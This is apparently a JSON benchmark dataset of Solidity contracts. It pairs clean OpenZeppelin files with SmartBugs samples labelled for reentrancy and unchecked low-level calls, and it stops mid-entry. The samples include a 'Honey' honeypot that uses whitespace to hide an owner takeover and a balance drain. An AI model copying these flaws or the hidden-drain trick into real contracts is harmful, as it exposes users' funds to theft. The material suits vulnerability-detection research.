[
  {
    "contract_name": "IERC20",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/IERC20.sol)\n\npragma solidity >=0.4.16;\n\n/**\n * @dev Interface of the ERC-20 standard as defined in the ERC.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n",
    "num_lines": 80,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Honey\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 46,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "Bytes",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/Bytes.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/Bytes.sol)\n\npragma solidity ^0.8.24;\n\nimport {Math} from \"./math/Math.sol\";\n\n/**\n * @dev Bytes operations.\n */\nlibrary Bytes {\n    /**\n     * @dev Forward search for `s` in `buffer`\n     * * If `s` is present in the buffer, returns the index of the first instance\n     * * If `s` is not present in the buffer, returns type(uint256).max\n     *\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/indexOf[Javascript's `Array.indexOf`]\n     */\n    function indexOf(bytes memory buffer, bytes1 s) internal pure returns (uint256) {\n        return indexOf(buffer, s, 0);\n    }\n\n    /**\n     * @dev Forward search for `s` in `buffer` starting at position `pos`\n     * * If `s` is present in the buffer (at or after `pos`), returns the index of the next instance\n     * * If `s` is not present in the buffer (at or after `pos`), returns type(uint256).max\n     *\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/indexOf[Javascript's `Array.indexOf`]\n     */\n    function indexOf(bytes memory buffer, bytes1 s, uint256 pos) internal pure returns (uint256) {\n        uint256 length = buffer.length;\n        for (uint256 i = pos; i < length; ++i) {\n            if (bytes1(_unsafeReadBytesOffset(buffer, i)) == s) {\n                return i;\n            }\n        }\n        return type(uint256).max;\n    }\n\n    /**\n     * @dev Backward search for `s` in `buffer`\n     * * If `s` is present in the buffer, returns the index of the last instance\n     * * If `s` is not present in the buffer, returns type(uint256).max\n     *\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/lastIndexOf[Javascript's `Array.lastIndexOf`]\n     */\n    function lastIndexOf(bytes memory buffer, bytes1 s) internal pure returns (uint256) {\n        return lastIndexOf(buffer, s, type(uint256).max);\n    }\n\n    /**\n     * @dev Backward search for `s` in `buffer` starting at position `pos`\n     * * If `s` is present in the buffer (at or before `pos`), returns the index of the previous instance\n     * * If `s` is not present in the buffer (at or before `pos`), returns type(uint256).max\n     *\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/lastIndexOf[Javascript's `Array.lastIndexOf`]\n     */\n    function lastIndexOf(bytes memory buffer, bytes1 s, uint256 pos) internal pure returns (uint256) {\n        unchecked {\n            uint256 length = buffer.length;\n            for (uint256 i = Math.min(Math.saturatingAdd(pos, 1), length); i > 0; --i) {\n                if (bytes1(_unsafeReadBytesOffset(buffer, i - 1)) == s) {\n                    return i - 1;\n                }\n            }\n            return type(uint256).max;\n        }\n    }\n\n    /**\n     * @dev Copies the content of `buffer`, from `start` (included) to the end of `buffer` into a new bytes object in\n     * memory.\n     *\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice[Javascript's `Array.slice`]\n     */\n    function slice(bytes memory buffer, uint256 start) internal pure returns (bytes memory) {\n        return slice(buffer, start, buffer.length);\n    }\n\n    /**\n     * @dev Copies the content of `buffer`, from `start` (included) to `end` (excluded) into a new bytes object in\n     * memory. The `end` argument is truncated to the length of the `buffer`.\n     *\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice[Javascript's `Array.slice`]\n     */\n    function slice(bytes memory buffer, uint256 start, uint256 end) internal pure returns (bytes memory) {\n        // sanitize\n        end = Math.min(end, buffer.length);\n        start = Math.min(start, end);\n\n        // allocate and copy\n        bytes memory result = new bytes(end - start);\n        assembly (\"memory-safe\") {\n            mcopy(add(result, 0x20), add(add(buffer, 0x20), start), sub(end, start))\n        }\n\n        return result;\n    }\n\n    /**\n     * @dev Moves the content of `buffer`, from `start` (included) to the end of `buffer` to the start of that buffer.\n     *\n     * NOTE: This function modifies the provided buffer in place. If you need to preserve the original buffer, use {slice} instead\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice[Javascript's `Array.splice`]\n     */\n    function splice(bytes memory buffer, uint256 start) internal pure returns (bytes memory) {\n        return splice(buffer, start, buffer.length);\n    }\n\n    /**\n     * @dev Moves the content of `buffer`, from `start` (included) to end (excluded) to the start of that buffer. The\n     * `end` argument is truncated to the length of the `buffer`.\n     *\n     * NOTE: This function modifies the provided buffer in place. If you need to preserve the original buffer, use {slice} instead\n     * NOTE: replicates the behavior of https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice[Javascript's `Array.splice`]\n     */\n    function splice(bytes memory buffer, uint256 start, uint256 end) internal pure returns (bytes memory) {\n        // sanitize\n        end = Math.min(end, buffer.length);\n        start = Math.min(start, end);\n\n        // allocate and copy\n        assembly (\"memory-safe\") {\n            mcopy(add(buffer, 0x20), add(add(buffer, 0x20), start), sub(end, start))\n            mstore(buffer, sub(end, start))\n        }\n\n        return buffer;\n    }\n\n    /**\n     * @dev Replaces bytes in `buffer` starting at `pos` with all bytes from `replacement`.\n     *\n     * Parameters are clamped to valid ranges (i.e. `pos` is clamped to `[0, buffer.length]`).\n     * If `pos >= buffer.length`, no replacement occurs and the buffer is returned unchanged.\n     *\n     * NOTE: This function modifies the provided buffer in place.\n     */\n    function replace(bytes memory buffer, uint256 pos, bytes memory replacement) internal pure returns (bytes memory) {\n        return replace(buffer, pos, replacement, 0, replacement.length);\n    }\n\n    /**\n     * @dev Replaces bytes in `buffer` starting at `pos` with bytes from `replacement` starting at `offset`.\n     * Copies at most `length` bytes from `replacement` to `buffer`.\n     *\n     * Parameters are clamped to valid ranges (i.e. `pos` is clamped to `[0, buffer.length]`, `offset` is\n     * clamped to `[0, replacement.length]`, and `length` is clamped to `min(length, replacement.length - offset,\n     * buffer.length - pos))`. If `pos >= buffer.length` or `offset >= replacement.length`, no replacement occurs\n     * and the buffer is returned unchanged.\n     *\n     * NOTE: This function modifies the provided buffer in place.\n     */\n    function replace(\n        bytes memory buffer,\n        uint256 pos,\n        bytes memory replacement,\n        uint256 offset,\n        uint256 length\n    ) internal pure returns (bytes memory) {\n        // sanitize\n        pos = Math.min(pos, buffer.length);\n        offset = Math.min(offset, replacement.length);\n        length = Math.min(length, Math.min(replacement.length - offset, buffer.length - pos));\n\n        // allocate and copy\n        assembly (\"memory-safe\") {\n            mcopy(add(add(buffer, 0x20), pos), add(add(replacement, 0x20), offset), length)\n        }\n\n        return buffer;\n    }\n\n    /**\n     * @dev Concatenate an array of bytes into a single bytes object.\n     *\n     * For fixed bytes types, we recommend using the solidity built-in `bytes.concat` or (equivalent)\n     * `abi.encodePacked`.\n     *\n     * NOTE: this could be done in assembly with a single loop that expands starting at the FMP, but that would be\n     * significantly less readable. It might be worth benchmarking the savings of the full-assembly approach.\n     */\n    function concat(bytes[] memory buffers) internal pure returns (bytes memory) {\n        uint256 length = 0;\n        for (uint256 i = 0; i < buffers.length; ++i) {\n            length += buffers[i].length;\n        }\n\n        bytes memory result = new bytes(length);\n\n        uint256 offset = 0x20;\n        for (uint256 i = 0; i < buffers.length; ++i) {\n            bytes memory input = buffers[i];\n            assembly (\"memory-safe\") {\n                mcopy(add(result, offset), add(input, 0x20), mload(input))\n            }\n            unchecked {\n                offset += input.length;\n            }\n        }\n\n        return result;\n    }\n\n    /**\n     * @dev Split each byte in `input` into two nibbles (4 bits each)\n     *\n     * Example: hex\"01234567\" \u2192 hex\"0001020304050607\"\n     */\n    function toNibbles(bytes memory input) internal pure returns (bytes memory output) {\n        assembly (\"memory-safe\") {\n            let length := mload(input)\n            output := mload(0x40)\n            mstore(0x40, add(add(output, 0x20), mul(length, 2)))\n            mstore(output, mul(length, 2))\n            for {\n                let i := 0\n            } lt(i, length) {\n                i := add(i, 0x10)\n            } {\n                let chunk := shr(128, mload(add(add(input, 0x20), i)))\n                chunk := and(\n                    0x0000000000000000ffffffffffffffff0000000000000000ffffffffffffffff,\n                    or(shl(64, chunk), chunk)\n                )\n                chunk := and(\n                    0x00000000ffffffff00000000ffffffff00000000ffffffff00000000ffffffff,\n                    or(shl(32, chunk), chunk)\n                )\n                chunk := and(\n                    0x0000ffff0000ffff0000ffff0000ffff0000ffff0000ffff0000ffff0000ffff,\n                    or(shl(16, chunk), chunk)\n                )\n                chunk := and(\n                    0x00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff00ff,\n                    or(shl(8, chunk), chunk)\n                )\n                chunk := and(\n                    0x0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f,\n                    or(shl(4, chunk), chunk)\n                )\n                mstore(add(add(output, 0x20), mul(i, 2)), chunk)\n            }\n        }\n    }\n\n    /**\n     * @dev Returns true if the two byte buffers are equal.\n     */\n    function equal(bytes memory a, bytes memory b) internal pure returns (bool) {\n        return a.length == b.length && keccak256(a) == keccak256(b);\n    }\n\n    /**\n     * @dev Reverses the byte order of a bytes32 value, converting between little-endian and big-endian.\n     * Inspired by https://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel[Reverse Parallel]\n     */\n    function reverseBytes32(bytes32 value) internal pure returns (bytes32) {\n        value = // swap bytes\n            ((value >> 8) & 0x00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF) |\n            ((value & 0x00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF) << 8);\n        value = // swap 2-byte long pairs\n            ((value >> 16) & 0x0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF) |\n            ((value & 0x0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF) << 16);\n        value = // swap 4-byte long pairs\n            ((value >> 32) & 0x00000000FFFFFFFF00000000FFFFFFFF00000000FFFFFFFF00000000FFFFFFFF) |\n            ((value & 0x00000000FFFFFFFF00000000FFFFFFFF00000000FFFFFFFF00000000FFFFFFFF) << 32);\n        value = // swap 8-byte long pairs\n            ((value >> 64) & 0x0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF) |\n            ((value & 0x0000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF) << 64);\n        return (value >> 128) | (value << 128); // swap 16-byte long pairs\n    }\n\n    /// @dev Same as {reverseBytes32} but optimized for 128-bit values.\n    function reverseBytes16(bytes16 value) internal pure returns (bytes16) {\n        value = // swap bytes\n            ((value & 0xFF00FF00FF00FF00FF00FF00FF00FF00) >> 8) |\n            ((value & 0x00FF00FF00FF00FF00FF00FF00FF00FF) << 8);\n        value = // swap 2-byte long pairs\n            ((value & 0xFFFF0000FFFF0000FFFF0000FFFF0000) >> 16) |\n            ((value & 0x0000FFFF0000FFFF0000FFFF0000FFFF) << 16);\n        value = // swap 4-byte long pairs\n            ((value & 0xFFFFFFFF00000000FFFFFFFF00000000) >> 32) |\n            ((value & 0x00000000FFFFFFFF00000000FFFFFFFF) << 32);\n        return (value >> 64) | (value << 64); // swap 8-byte long pairs\n    }\n\n    /// @dev Same as {reverseBytes32} but optimized for 64-bit values.\n    function reverseBytes8(bytes8 value) internal pure returns (bytes8) {\n        value = ((value & 0xFF00FF00FF00FF00) >> 8) | ((value & 0x00FF00FF00FF00FF) << 8); // swap bytes\n        value = ((value & 0xFFFF0000FFFF0000) >> 16) | ((value & 0x0000FFFF0000FFFF) << 16); // swap 2-byte long pairs\n        return (value >> 32) | (value << 32); // swap 4-byte long pairs\n    }\n\n    /// @dev Same as {reverseBytes32} but optimized for 32-bit values.\n    function reverseBytes4(bytes4 value) internal pure returns (bytes4) {\n        value = ((value & 0xFF00FF00) >> 8) | ((value & 0x00FF00FF) << 8); // swap bytes\n        return (value >> 16) | (value << 16); // swap 2-byte long pairs\n    }\n\n    /// @dev Same as {reverseBytes32} but optimized for 16-bit values.\n    function reverseBytes2(bytes2 value) internal pure returns (bytes2) {\n        return (value >> 8) | (value << 8);\n    }\n\n    /**\n     * @dev Counts the number of leading zero bits a bytes array. Returns `8 * buffer.length`\n     * if the buffer is all zeros.\n     */\n    function clz(bytes memory buffer) internal pure returns (uint256) {\n        for (uint256 i = 0; i < buffer.length; i += 0x20) {\n            bytes32 chunk = _unsafeReadBytesOffset(buffer, i);\n            if (chunk != bytes32(0)) {\n                return Math.min(8 * i + Math.clz(uint256(chunk)), 8 * buffer.length);\n            }\n        }\n        return 8 * buffer.length;\n    }\n\n    /**\n     * @dev Reads a bytes32 from a bytes array without bounds checking.\n     *\n     * NOTE: making this function internal would mean it could be used with memory unsafe offset, and marking the\n     * assembly block as such would prevent some optimizations.\n     */\n    function _unsafeReadBytesOffset(bytes memory buffer, uint256 offset) private pure returns (bytes32 value) {\n        // This is not memory safe in the general case, but all calls to this private function are within bounds.\n        assembly (\"memory-safe\") {\n            value := mload(add(add(buffer, 0x20), offset))\n        }\n    }\n}\n",
    "num_lines": 333,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x7a8721a9d64c74da899424c1b52acbf58ddc9782",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 52\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateDeposit\n{\n    mapping (address => uint) public balances;\n        \n    uint public MinDeposit = 1 ether;\n    address public owner;\n    \n    Log TransferLog;\n    \n    modifier onlyOwner() {\n        require(tx.origin == owner);\n        _;\n    }    \n    \n    function PrivateDeposit()\n    {\n        owner = msg.sender;\n        TransferLog = new Log();\n    }\n    \n    \n    \n    function setLog(address _lib) onlyOwner\n    {\n        TransferLog = Log(_lib);\n    }    \n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 88,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x8fd1e427396ddb511533cf9abdbebd0a7e08da35",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>=MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n                // <yes> <report> UNCHECKED_LL_CALLS\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
    "num_lines": 104,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 40\n */\n\npragma solidity ^0.4.19;\n\ncontract Private_Bank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function Private_Bank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 76,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x89c1b3807d4c67df034fffb62f3509561218d30b",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x89c1b3807d4c67df034fffb62f3509561218d30b.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 162,175,180,192\n */\n\npragma solidity ^0.4.9;\n\ncontract TownCrier {\n    struct Request { // the data structure for each request\n        address requester; // the address of the requester\n        uint fee; // the amount of wei the requester pays for the request\n        address callbackAddr; // the address of the contract to call for delivering response\n        bytes4 callbackFID; // the specification of the callback function\n        bytes32 paramsHash; // the hash of the request parameters\n    }\n   \n    event Upgrade(address newAddr);\n    event Reset(uint gas_price, uint min_fee, uint cancellation_fee); \n    event RequestInfo(uint64 id, uint8 requestType, address requester, uint fee, address callbackAddr, bytes32 paramsHash, uint timestamp, bytes32[] requestData); // log of requests, the Town Crier server watches this event and processes requests\n    event DeliverInfo(uint64 requestId, uint fee, uint gasPrice, uint gasLeft, uint callbackGas, bytes32 paramsHash, uint64 error, bytes32 respData); // log of responses\n    event Cancel(uint64 requestId, address canceller, address requester, uint fee, int flag); // log of cancellations\n\n    address public constant SGX_ADDRESS = 0x18513702cCd928F2A3eb63d900aDf03c9cc81593;// address of the SGX account\n\n    uint public GAS_PRICE = 5 * 10**10;\n    uint public MIN_FEE = 30000 * GAS_PRICE; // minimum fee required for the requester to pay such that SGX could call deliver() to send a response\n    uint public CANCELLATION_FEE = 25000 * GAS_PRICE; // charged when the requester cancels a request that is not responded\n\n    uint public constant CANCELLED_FEE_FLAG = 1;\n    uint public constant DELIVERED_FEE_FLAG = 0;\n    int public constant FAIL_FLAG = -2 ** 250;\n    int public constant SUCCESS_FLAG = 1;\n\n    bool public killswitch;\n\n    bool public externalCallFlag;\n\n    uint64 public requestCnt;\n    uint64 public unrespondedCnt;\n    Request[2**64] public requests;\n\n    int public newVersion = 0;\n\n    // Contracts that receive Ether but do not define a fallback function throw\n    // an exception, sending back the Ether (this was different before Solidity\n    // v0.4.0). So if you want your contract to receive Ether, you have to\n    // implement a fallback function.\n    function () {}\n\n    function TownCrier() public {\n        // Start request IDs at 1 for two reasons:\n        //   1. We can use 0 to denote an invalid request (ids are unsigned)\n        //   2. Storage is more expensive when changing something from zero to non-zero,\n        //      so this means the first request isn't randomly more expensive.\n        requestCnt = 1;\n        requests[0].requester = msg.sender;\n        killswitch = false;\n        unrespondedCnt = 0;\n        externalCallFlag = false;\n    }\n\n    function upgrade(address newAddr) {\n        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n            newVersion = -int(newAddr);\n            killswitch = true;\n            Upgrade(newAddr);\n        }\n    }\n\n    function reset(uint price, uint minGas, uint cancellationGas) public {\n        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n            GAS_PRICE = price;\n            MIN_FEE = price * minGas;\n            CANCELLATION_FEE = price * cancellationGas;\n            Reset(GAS_PRICE, MIN_FEE, CANCELLATION_FEE);\n        }\n    }\n\n    function suspend() public {\n        if (msg.sender == requests[0].requester) {\n            killswitch = true;\n        }\n    }\n\n    function restart() public {\n        if (msg.sender == requests[0].requester && newVersion == 0) {\n            killswitch = false;\n        }\n    }\n\n    function withdraw() public {\n        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n            if (!requests[0].requester.call.value(this.balance)()) {\n                throw;\n            }\n        }\n    }\n\n    function request(uint8 requestType, address callbackAddr, bytes4 callbackFID, uint timestamp, bytes32[] requestData) public payable returns (int) {\n        if (externalCallFlag) {\n            throw;\n        }\n\n        if (killswitch) {\n            externalCallFlag = true;\n            if (!msg.sender.call.value(msg.value)()) {\n                throw;\n            }\n            externalCallFlag = false;\n            return newVersion;\n        }\n\n        if (msg.value < MIN_FEE) {\n            externalCallFlag = true;\n            // If the amount of ether sent by the requester is too little or \n            // too much, refund the requester and discard the request.\n            if (!msg.sender.call.value(msg.value)()) {\n                throw;\n            }\n            externalCallFlag = false;\n            return FAIL_FLAG;\n        } else {\n            // Record the request.\n            uint64 requestId = requestCnt;\n            requestCnt++;\n            unrespondedCnt++;\n\n            bytes32 paramsHash = sha3(requestType, requestData);\n            requests[requestId].requester = msg.sender;\n            requests[requestId].fee = msg.value;\n            requests[requestId].callbackAddr = callbackAddr;\n            requests[requestId].callbackFID = callbackFID;\n            requests[requestId].paramsHash = paramsHash;\n\n            // Log the request for the Town Crier server to process.\n            RequestInfo(requestId, requestType, msg.sender, msg.value, callbackAddr, paramsHash, timestamp, requestData);\n            return requestId;\n        }\n    }\n\n    function deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public {\n        if (msg.sender != SGX_ADDRESS ||\n                requestId <= 0 ||\n                requests[requestId].requester == 0 ||\n                requests[requestId].fee == DELIVERED_FEE_FLAG) {\n            // If the response is not delivered by the SGX account or the \n            // request has already been responded to, discard the response.\n            return;\n        }\n\n        uint fee = requests[requestId].fee;\n        if (requests[requestId].paramsHash != paramsHash) {\n            // If the hash of request parameters in the response is not \n            // correct, discard the response for security concern.\n            return;\n        } else if (fee == CANCELLED_FEE_FLAG) {\n            // If the request is cancelled by the requester, cancellation \n            // fee goes to the SGX account and set the request as having\n            // been responded to.\n            // <yes> <report> UNCHECKED_LL_CALLS\n            SGX_ADDRESS.send(CANCELLATION_FEE);\n            requests[requestId].fee = DELIVERED_FEE_FLAG;\n            unrespondedCnt--;\n            return;\n        }\n\n        requests[requestId].fee = DELIVERED_FEE_FLAG;\n        unrespondedCnt--;\n\n        if (error < 2) {\n            // Either no error occurs, or the requester sent an invalid query.\n            // Send the fee to the SGX account for its delivering.\n            // <yes> <report> UNCHECKED_LL_CALLS\n            SGX_ADDRESS.send(fee);         \n        } else {\n            // Error in TC, refund the requester.\n            externalCallFlag = true;\n            // <yes> <report> 